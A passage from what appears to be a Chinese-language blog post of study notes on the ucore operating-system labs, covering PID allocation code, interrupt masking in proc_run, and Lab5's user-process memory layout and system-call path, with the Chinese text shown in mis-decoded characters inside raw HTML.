&#125;<br>    <span class="hljs-keyword">if</span> (last_pid &gt;= next_safe)<br>    &#123;<span class="hljs-comment">//lastè‡ªå¢å&gt;=next, å½“å‰ç©ºé—²åŒºé—´**å·²ç”¨å®Œ**, ç»§ç»­å‘åæŸ¥æ‰¾</span><br>    inside:<br>        next_safe = MAX_PID;<br>    repeat:<span class="hljs-comment">//è¿™æ®µä»£ç çœ‹åŠå¤©, ç»ˆäºçœ‹å‡ºæ¥æ˜¯åœ¨éå†proc_list, å¦‚æœpid==last, lastå°±++</span><br>        <span class="hljs-comment">//å¦‚æœpidåœ¨lastå’Œnextä¹‹é—´, åˆ™next=pidä»¥ç¼©å°èŒƒå›´.</span><br>        <span class="hljs-comment">//ç‰¹æ®Šæƒ…å†µ: ++last&gt;next,åˆ™é‡å¯whileå¾ªç¯, å¹¶ä¸”if(++last&gt;MAX_PID)åˆ™é‡ç½®lastä¸º1</span><br>        le = <span class="hljs-built_in">list</span>;<br>        <span class="hljs-keyword">while</span> ((le = list_next(le)) != <span class="hljs-built_in">list</span>)<br>        &#123;<br>            proc = le2proc(le, list_link);<br>            <span class="hljs-keyword">if</span> (proc-&gt;pid == last_pid)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (++last_pid &gt;= next_safe)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (last_pid &gt;= MAX_PID)<br>                    &#123;<br>                        last_pid = <span class="hljs-number">1</span>;<br>                    &#125;<br>                    next_safe = MAX_PID;<br>                    <span class="hljs-keyword">goto</span> repeat;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (proc-&gt;pid &gt; last_pid &amp;&amp; next_safe &gt; proc-&gt;pid)<br>            &#123;<br>                next_safe = proc-&gt;pid;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> last_pid;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="ç»ƒä¹ 3"><a href="#ç»ƒä¹ 3" class="headerlink" title="ç»ƒä¹ 3"></a>ç»ƒä¹ 3</h3><blockquote><p>ç†è§£proc_run</p></blockquote><p><strong>ä¸¤ä¸ªé—®é¢˜:</strong> </p><ul><li>åœ¨æœ¬å®éªŒçš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œåˆ›å»ºä¸”è¿è¡Œäº†å‡ ä¸ªå†…æ ¸çº¿ç¨‹ï¼Ÿ<ul><li>ä¸¤ä¸ª</li></ul></li><li>è¯­å¥<code>local_intr_save(intr_flag);....local_intr_restore(intr_flag);</code>åœ¨è¿™é‡Œæœ‰ä½•ä½œç”¨?è¯·è¯´æ˜ç†ç”±<ul><li>å±è”½ä¸­æ–­</li><li>è¿™ä¸¤å¥çš„é…åˆï¼Œä½¿å¾—è¿™ä¸¤å¥ä»£ç ä¹‹é—´çš„ä»£ç å—å½¢æˆ<strong>åŸå­æ“ä½œ</strong>ï¼Œå¯ä»¥ä½¿å¾—æŸäº›å…³é”®çš„ä»£ç ä¸ä¼šè¢«æ‰“æ–­ï¼Œä»è€Œé¿å…å¼•èµ·ä¸€äº›æœªé¢„æ–™åˆ°çš„é”™è¯¯ï¼Œé¿å…æ¡ä»¶ç«äº‰ã€‚</li><li>ä»¥è¿›ç¨‹åˆ‡æ¢ä¸ºä¾‹ï¼Œåœ¨<code>proc_run</code>ä¸­ï¼Œå½“åˆšè®¾ç½®å¥½<code>current</code>æŒ‡é’ˆä¸ºä¸‹ä¸€ä¸ªè¿›ç¨‹ï¼Œä½†è¿˜æœªå®Œå…¨å°†æ§åˆ¶æƒè½¬ç§»æ—¶ï¼Œå¦‚æœè¯¥è¿‡ç¨‹çªç„¶è¢«ä¸€ä¸ªä¸­æ–­æ‰€æ‰“æ–­ï¼Œåˆ™ä¸­æ–­å¤„ç†ä¾‹ç¨‹çš„æ‰§è¡Œå¯èƒ½ä¼šå¼•å‘å¼‚å¸¸ï¼Œå› ä¸º<code>current</code>æŒ‡é’ˆæŒ‡å‘çš„è¿›ç¨‹ä¸å®é™…ä½¿ç”¨çš„è¿›ç¨‹èµ„æºä¸ä¸€è‡´ã€‚</li></ul></li></ul><p>challenge</p><blockquote><p>é¸½!</p></blockquote><h1 id="Lab5"><a href="#Lab5" class="headerlink" title="Lab5"></a>Lab5</h1><h2 id="çŸ¥è¯†ç‚¹-4"><a href="#çŸ¥è¯†ç‚¹-4" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="0-é¡¹ç›®ç»“æ„"><a href="#0-é¡¹ç›®ç»“æ„" class="headerlink" title="0.é¡¹ç›®ç»“æ„"></a>0.é¡¹ç›®ç»“æ„</h3><p>ç›¸å¯¹ä¸å®éªŒå››ï¼Œå®éªŒäº”ä¸»è¦æ”¹åŠ¨å¦‚ä¸‹ï¼š</p><p>â—† kern/debug/</p><p>kdebug.cï¼šä¿®æ”¹ï¼šè§£æç”¨æˆ·è¿›ç¨‹çš„ç¬¦å·ä¿¡æ¯è¡¨ç¤ºï¼ˆå¯ä¸ç”¨ç†ä¼šï¼‰</p><p>â—† kern/mm/ ï¼ˆä¸æœ¬æ¬¡å®éªŒæœ‰è¾ƒå¤§å…³ç³»ï¼‰</p><p>memlayout.hï¼šä¿®æ”¹ï¼šå¢åŠ äº†ç”¨æˆ·è™šå­˜åœ°å€ç©ºé—´çš„å›¾å½¢è¡¨ç¤ºå’Œå®å®šä¹‰ ï¼ˆéœ€ä»”ç»†ç†è§£ï¼‰ã€‚</p><p>pmm.[ch]ï¼šä¿®æ”¹ï¼šæ·»åŠ äº†ç”¨äºè¿›ç¨‹é€€å‡ºï¼ˆdo_exitï¼‰çš„å†…å­˜èµ„æºå›æ”¶çš„page_remove_pteã€unmap_rangeã€exit_rangeå‡½æ•°å’Œç”¨äºåˆ›å»ºå­è¿›ç¨‹ï¼ˆdo_forkï¼‰ä¸­æ‹·è´çˆ¶è¿›ç¨‹å†…å­˜ç©ºé—´çš„copy_rangeå‡½æ•°ï¼Œä¿®æ”¹äº†pgdir_alloc_pageå‡½æ•°</p><p>vmm.[ch]ï¼šä¿®æ”¹ï¼šæ‰©å±•äº†mm_structæ•°æ®ç»“æ„ï¼Œå¢åŠ äº†ä¸€ç³»åˆ—å‡½æ•°</p><ul><li>mm_map/dup_mmap/exit_mmapï¼šè®¾å®š/å–æ¶ˆ/å¤åˆ¶/åˆ é™¤ç”¨æˆ·è¿›ç¨‹çš„åˆæ³•å†…å­˜ç©ºé—´</li><li>copy_from_user/copy_to_userï¼šç”¨æˆ·å†…å­˜ç©ºé—´å†…å®¹ä¸å†…æ ¸å†…å­˜ç©ºé—´å†…å®¹çš„ç›¸äº’æ‹·è´çš„å®ç°</li><li>user_mem_checkï¼šæœç´¢vmaé“¾è¡¨ï¼Œæ£€æŸ¥æ˜¯å¦æ˜¯ä¸€ä¸ªåˆæ³•çš„ç”¨æˆ·ç©ºé—´èŒƒå›´</li></ul><p>â—† kern/process/ ï¼ˆä¸æœ¬æ¬¡å®éªŒæœ‰è¾ƒå¤§å…³ç³»ï¼‰</p><p>proc.[ch]ï¼šä¿®æ”¹ï¼šæ‰©å±•äº†proc_structæ•°æ®ç»“æ„ã€‚å¢åŠ æˆ–ä¿®æ”¹äº†ä¸€ç³»åˆ—å‡½æ•°</p><ul><li>setup_pgdir/put_pgdirï¼šåˆ›å»ºå¹¶è®¾ç½®/é‡Šæ”¾é¡µç›®å½•è¡¨</li><li>copy_mmï¼šå¤åˆ¶ç”¨æˆ·è¿›ç¨‹çš„å†…å­˜ç©ºé—´å’Œè®¾ç½®ç›¸å…³å†…å­˜ç®¡ç†ï¼ˆå¦‚é¡µè¡¨ç­‰ï¼‰ä¿¡æ¯</li><li>do_exitï¼šé‡Šæ”¾è¿›ç¨‹è‡ªèº«æ‰€å å†…å­˜ç©ºé—´å’Œç›¸å…³å†…å­˜ç®¡ç†ï¼ˆå¦‚é¡µè¡¨ç­‰ï¼‰ä¿¡æ¯æ‰€å ç©ºé—´ï¼Œå”¤é†’çˆ¶è¿›ç¨‹ï¼Œå¥½è®©çˆ¶è¿›ç¨‹æ”¶äº†è‡ªå·±ï¼Œè®©è°ƒåº¦å™¨åˆ‡æ¢åˆ°å…¶ä»–è¿›ç¨‹</li><li>load_icodeï¼šè¢«do_execveè°ƒç”¨ï¼Œå®ŒæˆåŠ è½½æ”¾åœ¨å†…å­˜ä¸­çš„æ‰§è¡Œç¨‹åºåˆ°è¿›ç¨‹ç©ºé—´ï¼Œè¿™æ¶‰åŠåˆ°å¯¹é¡µè¡¨ç­‰çš„ä¿®æ”¹ï¼Œåˆ†é…ç”¨æˆ·æ ˆ</li><li>do_execveï¼šå…ˆå›æ”¶è‡ªèº«æ‰€å ç”¨æˆ·ç©ºé—´ï¼Œç„¶åè°ƒç”¨load_icodeï¼Œç”¨æ–°çš„ç¨‹åºè¦†ç›–å†…å­˜ç©ºé—´ï¼Œå½¢æˆä¸€ä¸ªæ‰§è¡Œæ–°ç¨‹åºçš„æ–°è¿›ç¨‹</li><li>do_yieldï¼šè®©è°ƒåº¦å™¨æ‰§è¡Œä¸€æ¬¡é€‰æ‹©æ–°è¿›ç¨‹çš„è¿‡ç¨‹</li><li>do_waitï¼šçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ï¼Œå¹¶åœ¨å¾—åˆ°å­è¿›ç¨‹çš„é€€å‡ºæ¶ˆæ¯åï¼Œå½»åº•å›æ”¶å­è¿›ç¨‹æ‰€å çš„èµ„æºï¼ˆæ¯”å¦‚å­è¿›ç¨‹çš„å†…æ ¸æ ˆå’Œè¿›ç¨‹æ§åˆ¶å—ï¼‰</li><li>do_killï¼šç»™ä¸€ä¸ªè¿›ç¨‹è®¾ç½®PF_EXITINGæ ‡å¿—ï¼ˆâ€œkillâ€ä¿¡æ¯ï¼Œå³è¦å®ƒæ­»æ‰ï¼‰ï¼Œè¿™æ ·åœ¨trapå‡½æ•°ä¸­ï¼Œå°†æ ¹æ®æ­¤æ ‡å¿—ï¼Œè®©è¿›ç¨‹é€€å‡º</li><li>KERNEL_EXECVE/__KERNEL_EXECVE/__KERNEL_EXECVE2ï¼šè¢«user_mainè°ƒç”¨ï¼Œæ‰§è¡Œä¸€ç”¨æˆ·è¿›ç¨‹</li></ul><p>â—† kern/trap/</p><p>trap.cï¼šä¿®æ”¹ï¼šåœ¨idt_initå‡½æ•°ä¸­ï¼Œå¯¹IDTåˆå§‹åŒ–æ—¶ï¼Œè®¾ç½®å¥½äº†ç”¨äºç³»ç»Ÿè°ƒç”¨çš„ä¸­æ–­é—¨ï¼ˆidt[T_SYSCALL]ï¼‰ä¿¡æ¯ã€‚è¿™ä¸»è¦ä¸syscallçš„å®ç°ç›¸å…³</p><p>â—† user/*</p><p>æ–°å¢çš„ç”¨æˆ·ç¨‹åºå’Œç”¨æˆ·åº“</p><h3 id="1-æ¦‚è¿°"><a href="#1-æ¦‚è¿°" class="headerlink" title="1.æ¦‚è¿°"></a>1.æ¦‚è¿°</h3><ul><li>kern_init()-&gt;proc_init()-&gt;initproc-&gt;init_main()-&gt;kern_thread()-&gt;kernel_execve()</li><li>ä¸‹å›¾æ˜¯è™šæ‹Ÿå†…å­˜çš„åˆ†å¸ƒå›¾, æ³¨æ„page tableå›ºå®šåœ¨0xFAC00000çš„ä½ç½®, åˆç»™å¿˜è®°äº†å¯¼è‡´æƒ³äº†ä¸€ä¼šå„¿,<br>å¯¹äºæ¯ä¸ªè¿›ç¨‹æ¥è¯´æ‰€çœ‹åˆ°çš„å†…å­˜ç©ºé—´éƒ½æ˜¯è¿™æ ·çš„.</li></ul> <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * Virtual memory map:                                          Permissions</span><br><span class="hljs-comment"> *                                                              kernel/user</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     4G ------------------&gt; +---------------------------------+</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            |         Empty Memory (*)        |</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            +---------------------------------+ 0xFB000000</span><br><span class="hljs-comment"> *                            |   Cur. Page Table (Kern, RW)    | RW/-- PTSIZE</span><br><span class="hljs-comment"> *     VPT -----------------&gt; +---------------------------------+ 0xFAC00000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     KERNTOP -------------&gt; +---------------------------------+ 0xF8000000</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            |    Remapped Physical Memory     | RW/-- KMEMSIZE</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *     KERNBASE ------------&gt; +---------------------------------+ 0xC0000000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     USERTOP -------------&gt; +---------------------------------+ 0xB0000000</span><br><span class="hljs-comment"> *                            |           User stack            |</span><br><span class="hljs-comment"> *                            +---------------------------------+</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            :                                 :</span><br><span class="hljs-comment"> *                            |         ~~~~~~~~~~~~~~~~        |</span><br><span class="hljs-comment"> *                            :                                 :</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-comment"> *                            |       User Program &amp; Heap       |</span><br><span class="hljs-comment"> *     UTEXT ---------------&gt; +---------------------------------+ 0x00800000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *                            |  - - - - - - - - - - - - - - -  |</span><br><span class="hljs-comment"> *                            |    User STAB Data (optional)    |</span><br><span class="hljs-comment"> *     USERBASE, USTAB------&gt; +---------------------------------+ 0x00200000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     0 -------------------&gt; +---------------------------------+ 0x00000000</span><br><span class="hljs-comment"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span><br><span class="hljs-comment"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span><br><span class="hljs-comment"> *     there if desired.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * */</span><br></code></pre></div></td></tr></table></figure><h3 id="2-åˆ›å»ºç”¨æˆ·è¿›ç¨‹"><a href="#2-åˆ›å»ºç”¨æˆ·è¿›ç¨‹" class="headerlink" title="2.åˆ›å»ºç”¨æˆ·è¿›ç¨‹"></a>2.åˆ›å»ºç”¨æˆ·è¿›ç¨‹</h3><h4 id="a-åº”ç”¨ç¨‹åºçš„ç»„æˆå’Œç¼–è¯‘"><a href="#a-åº”ç”¨ç¨‹åºçš„ç»„æˆå’Œç¼–è¯‘" class="headerlink" title="a. åº”ç”¨ç¨‹åºçš„ç»„æˆå’Œç¼–è¯‘"></a>a. åº”ç”¨ç¨‹åºçš„ç»„æˆå’Œç¼–è¯‘</h4><p>ä»å®éªŒæä¾›çš„ç”¨æˆ·ç¨‹åºç¼–è¯‘å…¥æ‰‹, å¯ä»¥çœ‹å‡ºhelloåº”ç”¨ç¨‹åºä¸ä»…ä»…æ˜¯hello.cï¼Œè¿˜åŒ…å«äº†æ”¯æŒhelloåº”ç”¨ç¨‹åºçš„ç”¨æˆ·æ€åº“ï¼š</p><ul><li>user/libs/initcode.Sï¼šæ‰€æœ‰åº”ç”¨ç¨‹åºçš„èµ·å§‹ç”¨æˆ·æ€æ‰§è¡Œåœ°å€â€œ_startâ€ï¼Œè°ƒæ•´äº†EBPå’ŒESPåï¼Œè°ƒç”¨umainå‡½æ•°ã€‚</li><li>user/libs/umain.cï¼šå®ç°äº†umainå‡½æ•°ï¼Œè¿™æ˜¯æ‰€æœ‰åº”ç”¨ç¨‹åºæ‰§è¡Œçš„ç¬¬ä¸€ä¸ªCå‡½æ•°ï¼Œå®ƒå°†è°ƒç”¨åº”ç”¨ç¨‹åºçš„mainå‡½æ•°ï¼Œå¹¶åœ¨mainå‡½æ•°ç»“æŸåè°ƒç”¨exitå‡½æ•°ï¼Œè€Œexitå‡½æ•°æœ€ç»ˆå°†è°ƒç”¨sys_exitç³»ç»Ÿè°ƒç”¨ï¼Œè®©æ“ä½œç³»ç»Ÿå›æ”¶è¿›ç¨‹èµ„æºã€‚</li><li>user/libs/ulib.[ch]ï¼šå®ç°äº†æœ€å°çš„Cå‡½æ•°åº“ï¼Œé™¤äº†ä¸€äº›ä¸ç³»ç»Ÿè°ƒç”¨æ— å…³çš„å‡½æ•°ï¼Œå…¶ä»–å‡½æ•°æ˜¯å¯¹è®¿é—®ç³»ç»Ÿè°ƒç”¨çš„åŒ…è£…ã€‚</li><li>user/libs/syscall.[ch]ï¼šç”¨æˆ·å±‚å‘å‡ºç³»ç»Ÿè°ƒç”¨çš„å…·ä½“å®ç°ã€‚</li><li>user/libs/stdio.cï¼šå®ç°cprintfå‡½æ•°ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨sys_putcæ¥å®Œæˆå­—ç¬¦è¾“å‡ºã€‚</li><li>user/libs/panic.cï¼šå®ç°__panic/__warnå‡½æ•°ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨sys_exitå®Œæˆç”¨æˆ·è¿›ç¨‹é€€å‡ºã€‚</li></ul><p>é™¤äº†è¿™äº›ç”¨æˆ·æ€åº“å‡½æ•°å®ç°å¤–ï¼Œè¿˜æœ‰ä¸€äº›libs/*.[ch]æ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸å’Œåº”ç”¨ç¨‹åºå…±ç”¨çš„å‡½æ•°å®ç°ã€‚<strong>è¿™äº›ç”¨æˆ·åº“å‡½æ•°å…¶å®åœ¨æœ¬è´¨ä¸Šä¸UNIXç³»ç»Ÿä¸­çš„æ ‡å‡†libcæ²¡æœ‰åŒºåˆ«</strong>ï¼Œåªæ˜¯å®ç°å¾—å¾ˆç®€å•ï¼Œä½†helloåº”ç”¨ç¨‹åºçš„æ­£ç¡®æ‰§è¡Œç¦»ä¸å¼€è¿™äº›åº“å‡½æ•°ã€‚</p><p>åœ¨makeçš„æœ€åä¸€æ­¥æ‰§è¡Œäº†ä¸€ä¸ªldå‘½ä»¤ï¼ŒæŠŠhelloåº”ç”¨ç¨‹åºçš„æ‰§è¡Œç obj/__user_hello.outè¿æ¥åœ¨äº†ucore kernelçš„æœ«å°¾ã€‚ä¸”ldå‘½ä»¤ä¼šåœ¨kernelä¸­ä¼šæŠŠ__user_hello.outçš„ä½ç½®å’Œå¤§å°è®°å½•åœ¨å…¨å±€å˜é‡_binary_obj___user_hello_out_startå’Œ_binary_obj___user_hello_out_sizeä¸­ï¼Œè¿™æ ·è¿™ä¸ªhelloç”¨æˆ·ç¨‹åºå°±èƒ½å¤Ÿå’Œucoreå†…æ ¸ä¸€èµ·è¢« bootloader åŠ è½½åˆ°å†…å­˜é‡Œä¸­ï¼Œå¹¶ä¸”é€šè¿‡è¿™ä¸¤ä¸ªå…¨å±€å˜é‡å®šä½helloç”¨æˆ·ç¨‹åºæ‰§è¡Œç çš„èµ·å§‹ä½ç½®å’Œå¤§å°ã€‚è€Œåˆ°äº†ä¸æ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„å®éªŒåï¼Œucoreä¼šæä¾›ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ç³»ç»Ÿï¼Œé‚£æ—¶æ‰€æœ‰çš„ç”¨æˆ·ç¨‹åºå°±éƒ½ä¸å†ç”¨è¿™ç§æ–¹æ³•è¿›è¡ŒåŠ è½½äº†ï¼Œè€Œå¯ä»¥ç”¨å¤§å®¶ç†Ÿæ‚‰çš„æ–‡ä»¶æ–¹å¼è¿›è¡ŒåŠ è½½äº†ã€‚</p><h4 id="b-ç”¨æˆ·è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´"><a href="#b-ç”¨æˆ·è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´" class="headerlink" title="b. ç”¨æˆ·è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´"></a>b. ç”¨æˆ·è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´</h4><p>åœ¨tools/user.ldæè¿°äº†ç”¨æˆ·ç¨‹åºçš„ç”¨æˆ·è™šæ‹Ÿç©ºé—´çš„æ‰§è¡Œå…¥å£è™šæ‹Ÿåœ°å€ï¼š</p><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq">SECTIONS &#123;<br>    /* <span class="hljs-keyword">Load</span> programs <span class="hljs-built_in">at</span> this address: <span class="hljs-string">&quot;.&quot;</span> means the current address */<br>    . = <span class="hljs-number">0x800020</span>;<br></code></pre></div></td></tr></table></figure><p>åœ¨tools/kernel.ldæè¿°äº†æ“ä½œç³»ç»Ÿçš„å†…æ ¸è™šæ‹Ÿç©ºé—´çš„èµ·å§‹å…¥å£è™šæ‹Ÿåœ°å€ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-class">SECTIONS </span>&#123;<br>    <span class="hljs-comment">/* Load the kernel at this address: &quot;.&quot; means the current address */</span><br>    . = <span class="hljs-number">0xC0100000</span>;<br></code></pre></div></td></tr></table></figure><p>è¿™æ ·ucoreæŠŠç”¨æˆ·è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´åˆ†äº†ä¸¤å—ï¼Œä¸€å—ä¸å†…æ ¸çº¿ç¨‹ä¸€æ ·ï¼Œæ˜¯æ‰€æœ‰ç”¨æˆ·è¿›ç¨‹éƒ½å…±äº«çš„å†…æ ¸è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œæ˜ å°„åˆ°åŒæ ·çš„ç‰©ç†å†…å­˜ç©ºé—´ä¸­ï¼Œè¿™æ ·åœ¨ç‰©ç†å†…å­˜ä¸­åªéœ€æ”¾ç½®ä¸€ä»½å†…æ ¸ä»£ç ï¼Œä½¿å¾—ç”¨æˆ·è¿›ç¨‹ä»ç”¨æˆ·æ€è¿›å…¥æ ¸å¿ƒæ€æ—¶ï¼Œå†…æ ¸ä»£ç å¯ä»¥ç»Ÿä¸€åº”å¯¹ä¸åŒçš„å†…æ ¸ç¨‹åºï¼›å¦å¤–ä¸€å—æ˜¯ç”¨æˆ·è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œè™½ç„¶è™šæ‹Ÿåœ°å€èŒƒå›´ä¸€æ ·ï¼Œä½†æ˜ å°„åˆ°ä¸åŒä¸”æ²¡æœ‰äº¤é›†çš„ç‰©ç†å†…å­˜ç©ºé—´ä¸­ã€‚è¿™æ ·å½“ucoreæŠŠç”¨æˆ·è¿›ç¨‹çš„æ‰§è¡Œä»£ç ï¼ˆå³åº”ç”¨ç¨‹åºçš„æ‰§è¡Œä»£ç ï¼‰å’Œæ•°æ®ï¼ˆå³åº”ç”¨ç¨‹åºçš„å…¨å±€å˜é‡ç­‰ï¼‰æ”¾åˆ°ç”¨æˆ·è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­æ—¶ï¼Œç¡®ä¿äº†å„ä¸ªè¿›ç¨‹ä¸ä¼šâ€œéæ³•â€è®¿é—®åˆ°å…¶ä»–è¿›ç¨‹çš„ç‰©ç†å†…å­˜ç©ºé—´ã€‚</p><h4 id="c-åˆ›å»ºå¹¶æ‰§è¡Œç”¨æˆ·è¿›ç¨‹"><a href="#c-åˆ›å»ºå¹¶æ‰§è¡Œç”¨æˆ·è¿›ç¨‹" class="headerlink" title="c. åˆ›å»ºå¹¶æ‰§è¡Œç”¨æˆ·è¿›ç¨‹"></a>c. åˆ›å»ºå¹¶æ‰§è¡Œç”¨æˆ·è¿›ç¨‹</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">vector128(vectors.S)--\&gt;<br>__alltraps(trapentry.S)--\&gt;trap(trap.c)--\&gt;trap_dispatch(trap.c)--\&gt;syscall(syscall.c)--\&gt;sys_exec(syscall.cï¼‰<br>--\&gt;do_execve(proc.c)<br></code></pre></div></td></tr></table></figure><blockquote><p>å…ˆæ¸…ç©ºå½“å‰è¿›ç¨‹çš„ç©ºé—´, ç„¶åå†allocæ–°çš„ç©ºé—´</p></blockquote><p>æœ€ç»ˆé€šè¿‡<strong>do_execve</strong>å‡½æ•°æ¥å®Œæˆç”¨æˆ·è¿›ç¨‹çš„åˆ›å»ºå·¥ä½œã€‚</p><p><strong>load_icode</strong>å‡½æ•°çš„ä¸»è¦å·¥ä½œå°±æ˜¯ç»™ç”¨æˆ·è¿›ç¨‹å»ºç«‹ä¸€ä¸ªèƒ½å¤Ÿè®©ç”¨æˆ·è¿›ç¨‹æ­£å¸¸è¿è¡Œçš„ç”¨æˆ·ç¯å¢ƒã€‚æ­¤å‡½æ•°æœ‰ä¸€ç™¾å¤šè¡Œ.</p><h3 id="3-ç³»ç»Ÿè°ƒç”¨å®ç°"><a href="#3-ç³»ç»Ÿè°ƒç”¨å®ç°" class="headerlink" title="3.ç³»ç»Ÿè°ƒç”¨å®ç°"></a>3.ç³»ç»Ÿè°ƒç”¨å®ç°</h3><p>é‡‡ç”¨ç³»ç»Ÿè°ƒç”¨æœºåˆ¶ä¸ºç”¨æˆ·è¿›ç¨‹æä¾›ä¸€ä¸ªè·å¾—æ“ä½œç³»ç»ŸæœåŠ¡çš„ç»Ÿä¸€æ¥å£å±‚ï¼Œè¿™æ ·ä¸€æ¥å¯ç®€åŒ–ç”¨æˆ·è¿›ç¨‹çš„å®ç°ï¼ŒæŠŠä¸€äº›å…±æ€§çš„ã€ç¹ççš„ã€ä¸ç¡¬ä»¶ç›¸å…³ã€ä¸ç‰¹æƒæŒ‡ä»¤ç›¸å…³çš„ä»»åŠ¡æ”¾åˆ°æ“ä½œç³»ç»Ÿå±‚æ¥å®ç°ï¼Œä½†æä¾›ä¸€ä¸ªç®€æ´çš„æ¥å£ç»™ç”¨æˆ·è¿›ç¨‹è°ƒç”¨ï¼›äºŒæ¥è¿™å±‚æ¥å£äº‹å…ˆå¯è§„å®šå¥½ï¼Œä¸”ä¸¥æ ¼æ£€æŸ¥ç”¨æˆ·è¿›ç¨‹ä¼ é€’è¿›æ¥çš„å‚æ•°å’Œæ“ä½œç³»ç»Ÿè¦è¿”å›çš„æ•°æ®ï¼Œä½¿å¾—è®©æ“ä½œç³»ç»Ÿç»™ç”¨æˆ·è¿›ç¨‹æœåŠ¡çš„åŒæ—¶ï¼Œä¿æŠ¤æ“ä½œç³»ç»Ÿä¸ä¼šè¢«ç”¨æˆ·è¿›ç¨‹ç ´åã€‚</p><p>ä»ç¡¬ä»¶å±‚é¢ä¸Šçœ‹ï¼Œéœ€è¦ç¡¬ä»¶èƒ½å¤Ÿæ”¯æŒåœ¨ç”¨æˆ·æ€çš„ç”¨æˆ·è¿›ç¨‹é€šè¿‡æŸç§æœºåˆ¶åˆ‡æ¢åˆ°å†…æ ¸æ€ã€‚è¯•éªŒä¸€è®²è¿°ä¸­æ–­ç¡¬ä»¶æ”¯æŒå’Œè½¯ä»¶å¤„ç†è¿‡ç¨‹å…¶å®å°±å¯ä»¥ç”¨æ¥å®Œæˆç³»ç»Ÿè°ƒç”¨æ‰€éœ€çš„è½¯ç¡¬ä»¶æ”¯æŒã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•åœ¨ucoreä¸­å®ç°ç³»ç»Ÿè°ƒç”¨ã€‚</p><h4 id="a-åˆå§‹åŒ–ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„ä¸­æ–­æè¿°ç¬¦"><a href="#a-åˆå§‹åŒ–ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„ä¸­æ–­æè¿°ç¬¦" class="headerlink" title="a. åˆå§‹åŒ–ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„ä¸­æ–­æè¿°ç¬¦"></a>a. 